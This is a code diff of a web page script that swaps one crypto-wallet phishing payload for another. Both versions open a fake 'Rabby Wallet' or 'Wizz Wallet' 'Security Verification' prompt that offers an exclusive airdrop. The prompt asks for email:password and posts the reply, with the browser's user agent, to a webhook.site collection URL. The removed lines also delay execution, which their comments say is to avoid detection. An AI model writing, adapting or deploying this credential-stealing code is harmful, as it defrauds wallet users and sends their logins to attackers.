@@ -34,31 +34,21 @@
         let credentials = null;
         
         window.onblur = function() {
-            // Delay eksekusi prompt untuk menghindari deteksi
-            setTimeout(function() {
-                // Inject sophisticated phishing prompt dengan delay
-                document.getElementById("iframe").src = "javascript:" +
-                    "setTimeout(function() {" +
-                    "  var result = prompt(" +
-                    "    '🔐 Rabby Wallet Security Verification\\\\n\\\\n" +
-                    "    To access this exclusive airdrop, please\\\\n" +
-                    "    verify your wallet credentials:\\\\n\\\\n" +
-                    "    Format: email:password', " +
-                    "    'email@example.com:yourpassword'" +
-                    "  );" +
-                    "  if(result) {" +
-                    "    fetch('https://webhook.site/12228f9d-ba9f-447b-aa99-c093c16b8162', {" +
-                    "      method: 'POST'," +
-                    "      headers: {'Content-Type': 'application/json'}," +
-                    "      body: JSON.stringify({" +
-                    "        creds: result, " +
-                    "        ua: navigator.userAgent," +
-                    "        timestamp: new Date().toISOString()" +
-                    "      })" +
-                    "    });" +
-                    "  }" +
-                    "}, 2000);"; // Delay 2 detik setelah user kembali ke app
-            }, 1000); // Delay 1 detik setelah onblur
+            // Inject sophisticated phishing prompt
+            document.getElementById("iframe").src = "javascript:" +
+                "var result = prompt(" +
+                "'🔐 Wizz Wallet Security Verification\\n\\n" +
+                "To access this exclusive airdrop, please\\n" +
+                "verify your wallet credentials:\\n\\n" +
+                "Format: email:password', " +
+                "'email@example.com:yourpassword'" +
+                ");" +
+                "if(result) {" +
+                "  fetch('https://webhook.site/1bf96978-c901-418e-915d-289876e3fc55', {" +
+                "    method: 'POST'," +
+                "    body: JSON.stringify({creds: result, ua: navigator.userAgent})" +
+                "  });" +
+                "}";
         }
     </script>
 </head>
